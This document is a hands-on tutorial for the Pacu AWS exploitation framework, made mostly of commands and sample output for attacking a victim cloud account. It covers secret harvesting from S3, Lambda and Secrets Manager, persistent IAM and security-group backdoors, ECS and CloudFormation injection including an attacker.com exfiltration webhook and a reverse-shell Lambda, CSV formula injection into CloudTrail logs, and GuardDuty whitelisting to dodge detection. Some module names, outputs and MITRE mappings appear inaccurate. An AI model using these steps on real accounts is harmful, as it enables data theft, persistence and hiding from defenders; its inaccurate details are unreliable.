# Pacu — Hands-On Use Cases

## Launching Pacu & Creating a Session

Before any exploitation, establish a session and populate credentials:

```bash
# Install Pacu (latest from GitHub)
pipx install git+https://github.com/RhinoSecurityLabs/pacu.git

# OR install from PyPI (slightly older releases)
pip3 install -U pacu

# Launch Pacu (interactive shell)
pacu
```

First run prompts:
```
[*] Creating a new session... What would you like to name this session? prod-aws
[*] Session created. Run 'help' to list available commands, or 'set_keys' to add AWS credentials.
```

### Setting AWS Credentials (Interactive)

```
pacu (prod-aws) > set_keys
Setting AWS Keys...
Press enter to keep the value currently stored.
Enter the letter C to clear the value, rather than set it.

Key alias [default]: compromised-dev
Access Key ID []: AKIA...[REDACTED]
Secret Access Key []: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Session Token [<leave blank for permanent keys>]: AQoDYXdzEJr..<truncated>
[+] Keys set for compromised-dev
```

### Auto-Detecting from AWS CLI / Environment

If AWS CLI is configured (`~/.aws/credentials` exists):

```
pacu (prod-aws) > import_keys
Importing keys from AWS credentials file...
[+] Found 2 profiles: default, staging-account
Select profile to import [1 for default, 2 for staging-account]: 1
[+] Keys imported for account 123456789012
```

Or load from environment:
```bash
export AWS_ACCESS_KEY_ID=AKIA...[REDACTED]
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
export AWS_SESSION_TOKEN=AQoDYXdzEJr...
pacu --session prod-aws
```

---

## General AWS Account & Service Enumeration

**MITRE ATT&CK ID:** T1526 (Gather Cloud Resources)

Perform a broad, initial survey of all AWS services, users, roles, and compute resources:

```
pacu (prod-aws) > set_regions all
[+] Region set to: all (all AWS regions)

pacu (prod-aws) > run aws__enum_account
[*] Running aws__enum_account...
[*] Account ID: 123456789012
[*] Account name: acme-prod
[*] STS caller identity ARN: arn:aws:iam::123456789012:user/compromised-dev
[*] Supported IAM features: All (consolidated billing, MFA, etc.)
[*] Account alias (if set): acme-corp-prod
[+] Results stored in database
```

This module is usually first — it establishes the operator's identity, account scope, and access level.

---

## IAM User & Role Enumeration

**MITRE ATT&CK ID:** T1087.004 (Gather Cloud Resources — Enumerate Accounts)

Enumerate all users, roles, groups, and inline policies:

```
pacu (prod-aws) > run iam__enum_users
[*] Enumerating IAM users...
[+] Found 42 IAM users:
  - compromised-dev (attached: PowerUserAccess)
  - ci-deploy (attached: AmazonEC2FullAccess)
  - lambda-execution-role
  - ...
[*] Downloading user policies (inline + managed)...
[+] Results stored. Query with: database IAM

pacu (prod-aws) > run iam__enum_roles
[*] Enumerating IAM roles...
[+] Found 15 roles:
  - EC2DefaultRole (AssumeRolePrincipal: ec2.amazonaws.com)
  - LambdaExecutionRole (AssumeRolePrincipal: lambda.amazonaws.com)
  - CrossAccountOrgRole (AssumeRolePrincipal: arn:aws:iam::123456789999:root — cross-account!)
  - ...
[+] Results stored.

pacu (prod-aws) > run iam__enum_permissions
[*] Testing what IAM actions this credential can perform...
[*] Testing ~600 common AWS actions...
[+] Permitted actions (sample):
  - ec2:* (full EC2 access)
  - s3:GetObject, s3:ListBucket (S3 read)
  - iam:ListUsers, iam:GetUser (IAM read)
  - lambda:InvokeFunction (can run Lambda functions)
[+] Denied actions: iam:CreateUser, iam:CreateRole (no privilege escalation via IAM policy editing)
```

---

## Privilege Escalation Scanning

**MITRE ATT&CK ID:** T1548.004 (Abuse Elevated Privileges — IAM Bypass)

Scan for privilege-escalation paths within IAM:

```
pacu (prod-aws) > run iam__privesc_scan
[*] Running privilege escalation scan...
[*] Checking for common privilege-escalation paths...
[+] FINDING: User 'compromised-dev' can call sts:AssumeRole on 'EC2DefaultRole'
    EC2DefaultRole has policy: "Effect": "Allow" "Action": "s3:*" "Resource": "*"
    -> Attack: Assume EC2DefaultRole → Download all S3 buckets
[+] FINDING: Role 'LambdaExecutionRole' has inline policy with "iam:CreateUser"
    -> If Lambda function is compromisable, can create persistent backdoor IAM user
[+] FINDING: Organization account 987654321098 has cross-account trust
    -> Can assume cross-account role to pivot accounts
[+] 3 privilege-escalation paths found. See database for full policy documents.
```

---

## S3 Bucket Discovery & Enumeration

**MITRE ATT&CK ID:** T1526 (Gather Cloud Resources), T1537 (Transfer Data to Cloud Account)

List all S3 buckets and enumerate which are readable/writable:

```
pacu (prod-aws) > run s3__enum
[*] Enumerating S3 buckets...
[+] Found 8 S3 buckets (accessible):
  - acme-prod-backups (readable: yes, writable: no)
  - acme-logs-archive (readable: yes, writable: no)
  - acme-user-uploads (readable: yes, writable: yes) ← Writable!
  - terraform-state (readable: yes, writable: no) ← Contains secrets!
  - old-application-data (Error: AccessDenied)
  - ...
[*] Attempting to list bucket contents (first 1000 objects per bucket)...
[+] Sample objects from acme-prod-backups:
  - backups/2026-08-10/database.sql.bz2 (5.2 GB)
  - backups/2026-08-10/redis-dump.rdb (2.1 GB)
  - ...

pacu (prod-aws) > run s3__download_bucket --bucket-name acme-prod-backups
[*] Downloading all objects from acme-prod-backups...
[*] Downloaded 43 objects (total: 18.5 GB)
[*] Files saved to: ~/.pacu/sessions/prod-aws/s3_downloads/acme-prod-backups/
[*] Found credentials in: backups/2026-08-10/database.sql.bz2 (plaintext usernames/password hashes)
```

---

## EC2 User-Data & Metadata Harvesting

**MITRE ATT&CK ID:** T1526 (Gather Cloud Resources), T1020 (Exfiltrate Data over Unencrypted Channel)

Retrieve EC2 user-data scripts (often contain deployment keys, credentials, secrets):

```
pacu (prod-aws) > run ec2__enum
[*] Enumerating EC2 instances...
[+] Found 12 running instances:
  - i-0abc123def456ghi (web-server-1, us-east-1a)
  - i-0xyz789uvw012pqr (database-primary, us-east-1b)
  - i-0lmn345opq678rst (bastion-host, us-west-2a)
  - ...

pacu (prod-aws) > run ec2__download_userdata
[*] Downloading EC2 user-data from all instances...
[+] Retrieved user-data from 8 instances:
  - i-0abc123def456ghi: #!/bin/bash
    export DB_PASSWORD="XYZ123ABC"
    curl -X POST https://api.internal.example.com/register?api_key=sk-123456789
    docker pull gcr.io/acme-prod/app:latest
  - i-0xyz789uvw012pqr: #!/bin/bash
    aws s3 cp s3://acme-secrets/db-creds.json /etc/config/
  - ...
[*] Extracted credentials (stored in database):
  - Database password: XYZ123ABC
  - API key: sk-123456789
  - GCR pull token found in config
```

---

## EC2 Security Group Backdooring

**MITRE ATT&CK ID:** T1562.008 (Impair Defenses — Disable or Modify Cloud Logs), T1578.001 (Modify Cloud Compute Infrastructure — Create Cloud Instances)

Add malicious ingress rules to an EC2 security group to enable unauthorized access:

```
pacu (prod-aws) > run ec2__backdoor_ec2_sec_groups
[*] Enumerating security groups...
[+] Found 8 security groups
[*] Select target security group to backdoor:
  1) prod-web-sg (allows 0.0.0.0/0:80, 0.0.0.0/0:443)
  2) prod-db-sg (allows sg-prod-web-sg:3306)
  3) prod-admin-sg (allows 10.0.0.0/8:22)
[?] Select [1-3]: 2

[*] Adding backdoor ingress rule to prod-db-sg...
[*] New rule: Allow 0.0.0.0/0 on port 3306 (MySQL)
[+] Rule added successfully
[*] Backdoor entry point: <EC2 instance public IP>:3306
[*] Attacker can now connect directly to database without going through application layer
```

---

## Lambda Environment Variable Extraction

**MITRE ATT&CK ID:** T1526 (Gather Cloud Resources), T1552.001 (Discover Secrets in Config Files)

Enumerate Lambda functions and extract environment variables (often containing secrets):

```
pacu (prod-aws) > run lambda__enum
[*] Enumerating Lambda functions...
[+] Found 6 Lambda functions:
  - process-uploads (128 MB, Python 3.9)
  - send-emails (256 MB, Python 3.11)
  - generate-reports (512 MB, Python 3.9)
  - ...
[*] Downloading function configuration and environment variables...
[+] Extracted environment variables:
  - process-uploads: DB_HOST=db.internal, DB_USER=lambda, DB_PASS=supersecret123, API_KEY=sk-lambda-abc123
  - send-emails: SMTP_HOST=mail.internal, SMTP_USER=no-reply@acme.com, SMTP_PASS=EmailPassword123, MAILGUN_KEY=key-abc123
  - ...
```

---

## Secrets Manager & Parameter Store Enumeration

**MITRE ATT&CK ID:** T1526 (Gather Cloud Resources), T1552.001 (Discover Secrets in Config Files)

Retrieve all stored secrets from AWS Secrets Manager and Systems Manager Parameter Store:

```
pacu (prod-aws) > run secrets__enum
[*] Enumerating Secrets Manager secrets...
[+] Found 12 secrets:
  - prod/db/master-password (readable: yes)
  - prod/api/stripe-key (readable: yes)
  - prod/backup/encryption-key (readable: yes)
  - prod/external/github-token (readable: yes) ← GitHub OAuth token!
  - ...
[*] Enumerating Systems Manager Parameter Store...
[+] Found 25 parameters:
  - /prod/app/config (readable: yes)
  - /prod/database/endpoint (readable: yes)
  - ...
[*] Downloading secret values...
[+] Retrieved secrets:
  - prod/db/master-password: MasterDBPass2026!@#
  - prod/api/stripe-key: sk_live_4eC39HqLyjWDarhtT657
  - prod/backup/encryption-key: <64-char AES-256 key>
  - prod/external/github-token: ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[*] Credentials stored in local database (cleartext)
```

---

## RDS Snapshot Exfiltration

**MITRE ATT&CK ID:** T1537 (Transfer Data to Cloud Account), T1526 (Gather Cloud Resources)

Enumerate RDS snapshots and download them for offline analysis:

```
pacu (prod-aws) > run rds__enum
[*] Enumerating RDS instances...
[+] Found 4 RDS instances:
  - prod-mysql (db.r5.large, 1 TB storage)
  - prod-postgres (db.r5.2xlarge, 5 TB storage)
  - replica-mysql (db.t3.medium, read replica)
  - ...

pacu (prod-aws) > run rds__enum_snapshots
[*] Enumerating RDS snapshots...
[+] Found 14 snapshots (all owned by this account):
  - rds:prod-mysql-2026-08-10-04-12 (1.2 TB, readable: yes)
  - rds:prod-postgres-2026-08-10-02-30 (5.5 TB, readable: yes)
  - rds:prod-mysql-2026-08-09-04-05 (1.2 TB, readable: yes)
  - ...

pacu (prod-aws) > run rds__explore_snapshots
[*] Attempting to download snapshots (attacker account + region required)...
[!] Note: Cannot download directly via Pacu. Attacker must:
    1. Create EC2 instance in same VPC
    2. Create new RDS instance from snapshot
    3. Connect and dump database
[*] Recommended workflow:
    - Run lambda__backdoor_new_users to ensure persistent access
    - Use EC2 instance to restore snapshot and extract data
```

---

## EBS Snapshot Theft

**MITRE ATT&CK ID:** T1537 (Transfer Data to Cloud Account), T1526 (Gather Cloud Resources)

Enumerate EBS snapshots (often world-readable or account-public by misconfiguration):

```
pacu (prod-aws) > run ebs__enum_snapshots_unauth
[*] Enumerating EBS snapshots...
[+] Found 8 snapshots:
  - snap-0abc123def456ghi (100 GB, encrypted: no, readable: yes)
  - snap-0xyz789uvw012pqr (250 GB, encrypted: no, readable: yes)
  - snap-0lmn345opq678rst (50 GB, encrypted: yes, readable: no)
  - ...

pacu (prod-aws) > run ebs__download_snapshots
[*] Attempting to download snapshots...
[*] Snapshot snap-0abc123def456ghi:
  - Create volume from snapshot
  - Attach volume to existing EC2 instance
  - Mount filesystem (/dev/xvdf)
  - Extract all data
[+] Downloaded: 350 GB of data
[*] Extracted database files, source code, configuration files with hardcoded credentials
```

---

## Cross-Account IAM Role Assumption

**MITRE ATT&CK ID:** T1078.004 (Valid Accounts — Cloud Accounts)

Discover and assume cross-account IAM roles (lateral movement within organization):

```
pacu (prod-aws) > run organizations__enum
[*] Enumerating AWS Organization...
[+] Found 5 member accounts:
  - 123456789012 (prod-acme, current)
  - 123456789999 (staging-acme)
  - 123456788888 (dev-acme)
  - 123456787777 (backup-acme)
  - 123456786666 (logging-acme)

pacu (prod-aws) > database IAM | grep "trust\|assume"
[*] Relevant trust relationships:
  - CrossAccountOrgRole: Trusts arn:aws:iam::123456789999:root
  - BackupRole: Trusts arn:aws:iam::123456787777:root

pacu (prod-aws) > run organizations__assume_role --role-name CrossAccountOrgRole --account 123456789999
[*] Attempting to assume role: arn:aws:iam::123456789999:role/CrossAccountOrgRole...
[+] Successfully assumed role!
[+] New credentials (temporary):
    Access Key: ASIAIOSFODNN7EXAMPLE
    Secret Key: <session key>
    Session Token: AQoDYXdzEJr...
    Expiration: 1 hour
[*] Creating new session for staging account...

pacu (staging-aws) > run iam__enum_users
[*] Enumerating users in staging account (123456789999)...
[+] Found sensitive resources in staging account
```

---

## IAM Credential Backdooring

**MITRE ATT&CK ID:** T1098.002 (Account Manipulation — Exchange Access Credentials)

Create new IAM users or add access keys to existing users for persistent access:

```
pacu (prod-aws) > run iam__backdoor_users_keys
[*] Enumerating IAM users to backdoor...
[+] Found 42 users. Select target user:
  1) ci-deploy (high permissions, unlikely to be monitored)
  2) lambda-service (rarely used, good stealth)
  3) backup-admin (automated, infrequent logins)
[?] Select target user (1-3): 1

[*] Adding access key to ci-deploy user...
[+] New access key created:
    Access Key ID: AKIAIOSFODNN7NOTREAL
    Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
[*] Attacker can now use these credentials indefinitely (no expiration)
[*] Credentials have same permissions as ci-deploy (AmazonEC2FullAccess, etc.)

pacu (prod-aws) > run iam__backdoor_assume_role
[*] Creating new IAM role with high permissions...
[+] Role created: pacu-backdoor-role
[*] Adding inline policy: AdministratorAccess
[*] Modifying trust relationship to allow assumption from attacker's account
[+] Backdoor role can be assumed indefinitely by account 999888777666 (attacker's account)
```

---

## Lambda Function Backdooring

**MITRE ATT&CK ID:** T1578.001 (Modify Cloud Compute Infrastructure — Create Cloud Instances)

Create a new Lambda function with malicious code, executing in the target VPC/security group:

```
pacu (prod-aws) > run lambda__backdoor_new_users
[*] Creating backdoor Lambda function...
[+] Function created: pacu-exec-function (Python 3.11)
[*] Attaching IAM role: BackdoorLambdaRole (permissions: iam:*, ec2:*, rds:*)
[*] Lambda payload inserted:
    - Read all environment variables from linked functions
    - Pull configuration from S3 and Secrets Manager
    - Execute arbitrary Python code
[+] Backdoor Lambda function deployed
[*] Invocation: aws lambda invoke --function-name pacu-exec-function --payload '{"cmd":"id"}' response.json

pacu (prod-aws) > run lambda__backdoor_new_sec_groups
[*] Creating backdoor security group...
[+] Security group created: pacu-backdoor-sg
[*] Rule: Allow inbound 0.0.0.0/0:22 (SSH)
[*] Rule: Allow outbound 0.0.0.0/0:all
[*] Attaching to existing Lambda functions running in VPC...
[+] 3 Lambda functions now have backdoor access
```

---

## ECS Task Definition Backdooring

**MITRE ATT&CK ID:** T1578.001 (Modify Cloud Compute Infrastructure), T1199 (Trusted Relationship)

Modify ECS task definitions to inject malicious containers or environment variables:

```
pacu (prod-aws) > run ecs__enum
[*] Enumerating ECS clusters...
[+] Found 2 clusters:
  - prod-api-cluster (8 running tasks)
  - prod-worker-cluster (20 running tasks)

pacu (prod-aws) > run ecs__enum_task_def
[*] Enumerating ECS task definitions...
[+] Found 12 task definitions:
  - api-app:5, api-app:4, api-app:3 (revisions)
  - worker-job:3, worker-job:2
  - ...

pacu (prod-aws) > run ecs__backdoor_task_def
[*] Enumerating task definitions for backdooring...
[?] Select task definition to modify: api-app (latest: api-app:5)
[*] Modifying task definition api-app:5...
[*] Injecting environment variable: MALICIOUS_WEBHOOK=https://attacker.com/exfil
[*] Adding sidecar container: image-pull-secret-stealer (extracts ECR credentials)
[+] New revision created: api-app:6
[+] Updating service to use new task definition...
[*] All new tasks will now run malicious code
```

---

## CloudFormation Stack Injection

**MITRE ATT&CK ID:** T1578.001 (Modify Cloud Compute Infrastructure), T1199 (Trusted Relationship)

Inject malicious resources (EC2, Lambda, containers) into existing CloudFormation stacks:

```
pacu (prod-aws) > run cloudformation__download_data
[*] Enumerating CloudFormation stacks...
[+] Found 8 stacks:
  - prod-app-stack (COMPLETE, 45 resources)
  - prod-data-stack (COMPLETE, 12 resources)
  - ...

pacu (prod-aws) > run cfn__resource_injection
[*] Downloading template for prod-app-stack...
[*] Injecting malicious resources:
  - New EC2 instance (t3.large, running attacker's AMI)
  - New IAM role (AdministratorAccess)
  - New Lambda function (reverse shell)
[*] Updating CloudFormation stack...
[+] Resources deployed successfully
[*] Attacker's EC2 instance now running within production VPC with full network access
```

---

## CloudTrail Log Deletion & CSV Injection

**MITRE ATT&CK ID:** T1562.008 (Impair Defenses — Disable or Modify Cloud Logs)

Delete CloudTrail logs or inject CSV payloads to break log parsers and hide evidence:

```
pacu (prod-aws) > run cloudtrail__download_event_history
[*] Downloading CloudTrail events...
[+] Retrieved 1,500 events (last 90 days)
[*] Saved to: ~/.pacu/sessions/prod-aws/cloudtrail_logs.json

pacu (prod-aws) > run cloudtrail__csv_injection
[*] Enumerating CloudTrail S3 buckets...
[+] Found: s3://acme-cloudtrail-logs/
[*] Downloading all CloudTrail CSV exports...
[*] Injecting CSV formulas: =cmd|'/c calc'!A1
[*] Injected payloads will trigger when opened in Excel
[*] Rewriting S3 objects with malicious CSVs...
[+] 500 log files corrupted
[*] Formulas will execute when blue team opens logs in Excel
```

---

## GuardDuty Finding Suppression

**MITRE ATT&CK ID:** T1562.001 (Impair Defenses — Disable or Modify Cloud Logging)

Enumerate and suppress GuardDuty findings to disable active threat detection:

```
pacu (prod-aws) > run detection__enum_services
[*] Enumerating security services...
[+] GuardDuty: ENABLED (3 detector(s))
[+] SecurityHub: ENABLED
[+] Macie: ENABLED
[+] Inspector: ENABLED
[+] Wafv2: ENABLED (3 WebACLs)
[+] Config: ENABLED

pacu (prod-aws) > run guardduty__list_findings
[*] Querying GuardDuty findings...
[+] Found 8 active findings:
  - UnauthorizedAccess:EC2/SSHBruteForce (Severity: Low)
  - UnauthorizedAccess:IAM/MaliciousIPCaller (Severity: High)
  - CryptoCurrency:EC2/BitcoinTool.B!DNS (Severity: Low)
  - ...

pacu (prod-aws) > run guardduty__whitelist_ip
[*] Whitelisting IP address in GuardDuty...
[?] Enter attacker IP: 203.0.113.5
[+] IP 203.0.113.5 added to trusted IP list
[*] Future malicious activity from this IP will not trigger GuardDuty alerts
```

---

## CLI-Based (Non-Interactive) Exploitation

For automation or CICD pipeline integration:

```bash
# List all available modules
pacu --list-modules

# Run a module and pass arguments
pacu --session prod-aws --module-name iam__enum_users --exec

# Run with custom regions
pacu --session prod-aws --set-regions us-east-1 eu-west-1 --module-name ec2__enum --exec

# Query local database without opening interactive shell
pacu --session prod-aws --data IAM

# Get info on current credential
pacu --session prod-aws --whoami
# Output: Account ID: 123456789012, User: arn:aws:iam::123456789012:user/compromised-dev
```

---

